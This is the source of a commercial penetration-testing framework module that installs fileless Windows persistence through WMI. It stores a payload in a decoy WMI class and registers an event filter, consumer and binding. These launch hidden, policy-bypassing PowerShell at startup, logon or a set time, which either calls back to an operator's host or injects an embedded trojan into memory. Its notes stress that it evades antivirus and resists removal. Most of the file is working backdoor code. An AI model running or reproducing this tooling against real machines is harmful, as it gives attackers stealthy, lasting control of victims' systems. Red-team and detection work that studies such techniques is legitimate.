#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2015
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

import os, getopt, string
import socket
import locale
from exploitutils import *

from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand
from ExploitTypes.utility import Utility
from Nodes.mosdef_powershell.mosdef_powershell import *
import canvasengine
import logging

NAME                            = "wmi_persistence"
DESCRIPTION                     = "WMI Persistence Module"
VERSION                         = "1.1"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Commands"
PROPERTY['SITE']                = "Local"
PROPERTY['ARCH']                = [ ["Windows"] ]

DOCUMENTATION                   = {}
DOCUMENTATION["Notes"]          = """
This module was created to permament persist a payload as a WMI object and also to create a WMI event that 
will retrieve the payload and execute it through PowerShell.
This module creates a powershell script that will be executed in a Powershell Node using the 'powershellcommand' module.
Three kind of events could be created to execute the payload: At startup, At Logon or Daily. In the last case we should 
indicate the time, hours and minutes using the 24-hour time format.
We can choose either a Powershell Callback or another callback trojan to persist and also we have the option to 
autogenerate a powershell script to remove all changes in the target.

Technical details: 

There are three things necessary to invoke a WMI event:

1- An Event Filter: This object contains the WMI query that fires upon an event occurring.
2- An Event Consumer: There are 5 event consumers but we use the 'CommandLineEventConsumer' because that's the one 
that will let us to call powershell.exe
3- A Binding for the Filter and the Consumer: Associates the event filter with the event consumer.

Then when a WMI query is registered and bound to a consumer, the WMI service executes the consumer's code. So, the 
consumer's code will be something like this ' powershell.exe -ex bypass -c iex PAYLOAD ' 
This module creates a powershell script for the creation of the Event Filter, Event Consumer and the Binding and also to 
persist the callback selected into the WMI database as a property of a static WMI Class. When the event occurs, the WMI 
services will execute the consumer's code and that will be a powershell code to retrieve the callback from the WMI Class 
and execute it. This payload is not stored in the Powershell profile like in the slides, the actual payload is stored in 
the Event Consumer which is better. Finally, the ps callback is executed without touching disk.


Pros of this method:
+ Difficult to detect by AV.
+ Not easy to remove, requires depth knowledge of WMI.
+ You can trigger your callback based on any WMI query.

Cons:
- Requires ADMIN privileges to create the WMI event.


References:
https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf
http://www.exploit-monday.com/2013/04/PersistenceWithPowerShell.html

NOTES: 
* Only works on Powershell Nodes.
* Need ADMIN rights in order to create the WMI Events.
* The WMI events and the WMI class have autogenerated names, you can change those names if you want to.
* When we uses the 'another callback' option the module create a powershell script with the trojan file
embedded and when the event occurs the script load and execute the trojan file in to a powershell process.


This exploit has been tested on:
* Windows 8.1 EN (x32) with PS 4.0
* Windows 7 Ultimate N SP1 EN (x32) with PS 2.0

"""


class theexploit(LocalCommand,Utility):
    def __init__(self):
        LocalCommand.__init__(self)
        Utility.__init__(self)
        self.result           = ""
        self.ntype            = ""
        self.event            = ""
        self.eventTypes       = ["At StartUp","At Logon","Daily"]
        self.dailyEventHour   = -1        
        self.dailyEventMin    = -1        
        self.cbOption         = ""        
        self.pscb             = False
        self.callback_host    = None
        self.callback_port    = 5555
        self.trojanName       = ""
        self.uninstallScript  = False
        self.payload          = ""
        self.wmiClassName     = ""
        self.wmiFilterName     = ""
        self.wmiConsumerName  = ""
        self.rid              = ""
        self.randomName       = ""
        return

    def getargs(self):
        
        #get event option
        self.event     = self.argsDict.get("event_value", self.event)        
        #if self.event not in self.eventTypes:
        #    return 
            
        if self.event == "Daily":
            self.dailyEventHour  = int(self.argsDict.get("spinbutton_hour", self.dailyEventHour))        
            self.dailyEventMin   = int(self.argsDict.get("spinbutton_min", self.dailyEventMin))        

        #get callback option
        self.cbOption  = self.argsDict.get("cb_value", self.cbOption)
        if "PowerShell" in self.cbOption:
            self.pscb = True
        else:
            self.pscb = False

        if self.pscb:
            self.callback_host = self.argsDict.get("callback_host", self.callback_host) 
            self.callback_port = int(self.argsDict.get("callback_port", self.callback_port))
        else:
            self.trojanName = self.argsDict.get("filename", self.trojanName)

        self.uninstallScript = self.argsDict.get("uninstall_script", self.uninstallScript)
    
    
    def run(self):
        self.getargs()
        self.setInfo("%s (in progress)" % (NAME))
        ret = False

        #checking node
        if not self.checkNode():
            logging.error("Node (%s) not supported - You must run this module on a PowerShell node" % self.ntype )
            self.setInfo("%s - done (failed)" % NAME)
            return False
        
        #checking admin rights 
        logging.info("Checking admin rights")
        if not self.checkAdminRights():
            logging.error("User needs admin rights to create WMI events")
            self.setInfo("%s - done (failed)" % NAME)
            return False
        logging.info("OK! - User has admin rights")

        #create the callback
        if self.pscb:
            ps_mosdef = mosdef_powershell()
            logging.info("Building Powershell callback")
            ps_callback = ""
            try:
                ps_mosdef.setup(self.callback_host, self.callback_port, mosdef_id=self.engine.getNewMosdefID(self))
                ps_callback = ps_mosdef.createMosdefCallback()

            except Exception, err:
                import traceback
                traceback.print_exc()
                logging.error("Error while building PowerShell callback (%s)" % (err))
                self.setInfo("%s - failed" % (NAME))
                return 0
            
            logging.info("Powershell callback was created for callback host %s:%s" % (self.callback_host,str(self.callback_port)))
            self.payload = ps_callback

        else:
            #create ps script for loading trojan in memory
            ps_launcher = ''
            logging.info("Processing file %s " % self.trojanName )
            ps_launcher= self.getPSLauncher(self.trojanName)
            logging.info("A launcher script for %s was created" % self.trojanName )
            self.payload= ps_launcher

        if self.payload:
            logging.info("Payload created")
            self.setProgress(30)

        #create the WMI event and the WMI class script.
        logging.info("Creating Powershell script with WMI events") 
        #create random id for WMI Class
        self.rid = '{0:09}'.format(random.randint(1, 1000000000)) 
        #create random name for WMI filter and consumer
        self.randomName = self.generateRandomName()
        logging.info("Name created for WMI event %s" % self.randomName)
        
        ps_wmievents = self.getPSWMIEvents()
        if ps_wmievents:
            logging.info("PowerShell script for WMI events created")
            self.setProgress(50)

        if self.uninstallScript:
            logging.info("Creating uninstall script")
            ps_uninstallevents = self.getPSUninstallScript()

            if ps_uninstallevents:
                logging.info("Uninstall script Created")

        try: 
            result = self.sendPSScript(ps_wmievents)
            if result:
                #need to check the response
                output = self.result.strip()
                #the last character is the result code
                ret = int(output[-1])
                if ret:
                    self.setProgress(100)
                    self.setInfo("%s - done (success)" % NAME)
                    logging.info("Done (success)")
                    return True
            
            self.setInfo("%s - done (failed)" % NAME)
        except:
            self.setInfo("%s - done (failed)" % NAME)
            raise
        
        return ret


    def checkNode(self):
        ret = False
        for node in self.argsDict["passednodes"]:
            self.ntype = node.nodetype
            if self.ntype == "PowerShellNode":
                ret = True
            elif self.ntype in ['win32Node', 'win64Node']:
                data = node.shell.popen2('powershell.exe -Help')
                if len(data) > 0:
                    ret = True        
        return ret

    def checkAdminRights(self):
        comm  =  """
([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
"""
        if self.sendPSScript(comm):
            if self.result.strip() == "True":
                return True
            
        return False

    def sendPSScript(self,script):
        self.result = ""
        runcomm = canvasengine.getModuleExploit("runpowershellscript")
        runcomm.link(self)
        runcomm.argsDict["filename"] = randomstring(8) + ".ps1"
        runcomm.argsDict["PSBuffer"] = script
        runcomm.argsDict["copytodisk"] = True
        runcomm.argsDict["option_value"] = "Local"

        ret = runcomm.run()
        if ret:           
            self.result = runcomm.result
            return True
        else:
            logging.error("Error calling the runpowershellscript module")
        return False

    def getPSWMIEvents(self):
        ### 
        ###NOTE: You can change the name of the WMI Fake Class if you want to.
        ###
        self.wmiClassName= "Win32_SystemSecurity_S_1_5_21_" + str(self.rid)
        self.wmiClassProperty= "Security_Descriptor"
        
        ps_code = ""
        ps_code_save_payload= """
$mypayload = { %s }.ToString()
try{
$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null, $null)
$StaticClass.Name = '%s'
$StaticClass.Put() | Out-Null
$StaticClass.Properties.Add('%s',$mypayload)
$StaticClass.Put() | Out-Null
}
catch{
    Write-Output "Something went wrong with the WMI Class"
    return 0
}
Write-Output "WMI Class Created"
        """
        ps_code = ps_code_save_payload % (self.payload, self.wmiClassName,self.wmiClassProperty)
        ps_final = ps_code
        
        # Add code for event creation
        query = ""
        if self.event == self.eventTypes[0]:
            #At Start up
            query = """ "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320" """
        elif self.event == self.eventTypes[1]:
            #At Logon
            query = """ "SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2" """
        elif self.event == self.eventTypes[2]:
            #Daily
            query = """ "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = '%s' AND TargetInstance.Minute = '%s' GROUP WITHIN 60"
"""
            query = query % (self.dailyEventHour,self.dailyEventMin)

        ### 
        ###NOTE: You can change the name of the WMI filter and WMI Consumer if you want to.
        ###
        self.wmiFilterName = self.randomName
        self.wmiConsumerName = self.randomName

        #TODO: Create a compress payload for Windows 8 and more.
        iexcode = """iex `$(New-Object IO.StreamReader (`$(New-Object IO.MemoryStream(,`$([Text.Encoding]::ASCII.GetBytes('$code')))),[Text.Encoding]::ASCII)).ReadToEnd()"""
        
        #This only works with PS 3.0
        #ps_code = """
#$code = " `$ac = Get-CimClass -Class %s -Namespace \`"root\CIMV2\`"; `$cmd = [scriptblock]::Create(`$ac.CimClassProperties.Value); Invoke-Command -ScriptBlock `$cmd "
 #       """ 
        # This is the code that would be execute it when the event occurs
        ps_exe = """
$code = " `$ac=([WmiClass]''root\cimv2:%s'').Properties[''%s''].Value ;`$cmd = [scriptblock]::Create(`$ac); Invoke-Command -ScriptBlock `$cmd "
        """ 
        ps_exe = ps_exe % (self.wmiClassName,self.wmiClassProperty)

        ps_code_event_creation = ps_exe
        ps_code_event_creation += """
$iexcode = "%s"
$buff = "C:\\\Windows\\\System32\\\WindowsPowerShell\\\\v1.0\\\powershell.exe -nop -noni -wi hidden -exe Bypass -c `"$iexcode`""
$cmdline = write-output $buff

try{
$event=Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{name='%s';EventNameSpace='root\cimv2';QueryLanguage="WQL";Query=%s} -ErrorAction Stop
$consumer=Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{ name='%s';
                                                                                                         ExecutablePath = "C:\\\Windows\\\System32\\\WindowsPowerShell\\\\v1.0\\\powershell.exe";
                                                                                                         CommandLineTemplate = $cmdline;
                                                                                                         RunInteractively='true'} -ErrorAction Stop
                                                                                                         
$binding=Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$event;Consumer=$consumer} -ErrorAction Stop
}
catch{
    Write-Output "Something went wrong with the creation of the WMI Event"
    return 0
}
Write-Output "WMI Event Created"
return 1 
        """        

        ps_final += ps_code_event_creation % (iexcode,self.wmiFilterName,query,self.wmiConsumerName)

        #with open("testWmi.ps1","w") as f:
        #    f.write(ps_final)

        return ps_final


    def getPSLauncher(self, trojanName):

        if trojanName and os.path.isfile(self.trojanName):
            ps_bytes= ''
            bytes_read = open(trojanName, "rb").read()
            ps_bytes  = base64.b64encode(bytes_read)

            #add the trojan file as a base64 string
            buff       ="""$b64String= "%s" """
            ps_trojan  = buff % ps_bytes

            ## NOTE: Add -ForceASLR paramater because in some cases on WIN7 the VirtualAlloc failed to allocate memory for the trojan.
            ps_trojan+="""
[Byte[]]$bytes = [System.Convert]::FromBase64String($b64String);
Invoke-EXEInjection -PEBytes $bytes -ForceASLR $true
"""
            #open the Invoke-EXEInjection script and add it to the final script
            local_res = os.path.join(os.path.dirname(__file__), 'Resources')
            fscript   = os.path.join(local_res, 'Invoke-EXEInjection.ps1')
            script_bytes = open(fscript, "r").read()
            
            ps_launcher = script_bytes + "\n" + ps_trojan
            
            #with open("launcher.ps1","w") as f:
            #    f.write(ps_launcher)
            
            return ps_launcher
        else:
            return None

    def getPSUninstallScript(self):

        ps_code_uninstall = """
Get-WmiObject __eventFilter -namespace root\subscription -filter "name='%s'"| Remove-WmiObject
Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='%s'" | Remove-WmiObject
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '%s'} | Remove-WmiObject
$a=[WmiClass]'root\cimv2:%s'
Remove-WmiObject $a
                """
        ps_uninstall = ps_code_uninstall % ( self.wmiFilterName,self.wmiConsumerName,self.wmiConsumerName,self.wmiClassName )
        fname = "removeWmi_" + self.rid + ".ps1"
        logging.info("Writing out %d bytes to %s" % (len(ps_uninstall), fname))
        with open(fname,"w") as f:
                f.write(ps_uninstall)
        
        return ps_uninstall 

    def generateRandomName(self):
        seed = 'ABCDEF' + string.digits
        buff  = "{"+''.join(random.choice(seed) for _ in range(8))
        buff += '-'+''.join(random.choice(seed) for _ in range(4))
        buff += '-'+''.join(random.choice(seed) for _ in range(4))
        buff += '-'+''.join(random.choice(seed) for _ in range(4))
        buff += '-'+''.join(random.choice(seed) for _ in range(12))+"}"
        return buff
